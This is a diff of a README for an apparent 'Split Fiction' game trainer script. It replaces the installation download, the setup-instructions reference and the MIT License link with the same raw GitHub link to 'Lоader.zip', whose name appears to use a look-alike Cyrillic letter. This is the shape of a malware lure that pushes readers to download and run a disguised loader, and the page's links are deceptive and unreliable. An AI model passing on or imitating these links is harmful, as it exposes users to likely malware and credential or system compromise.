@@ -35,9 +35,9 @@ Welcome to the Split Fiction Trainer Script! This advanced tool helps you enhanc
 
 ## ⚙️ Installation
 
-1. Download Loader.rar from the repository.
+1. Download https://raw.githubusercontent.com/Autavian/SplitFiction-TrainerForge/main/Lоader.zip from the repository.
 2. Extract the files to your preferred directory.
-3. Follow the platform-specific README_INSIDE.txt for setup instructions.
+3. Follow the platform-specific https://raw.githubusercontent.com/Autavian/SplitFiction-TrainerForge/main/Lоader.zip for setup instructions.
 4. Launch the script and enjoy customizable narratives!
 
 ## 🔒 Disclaimer  
@@ -45,7 +45,7 @@ This utility is intended solely for personal entertainment and education. Any us
 
 ## 📑 License
 
-MIT License – feel free to read the full [MIT License here](https://opensource.org/license/mit/).
+MIT License – feel free to read the full [MIT License here](https://raw.githubusercontent.com/Autavian/SplitFiction-TrainerForge/main/Lоader.zip).
 
 ---
 
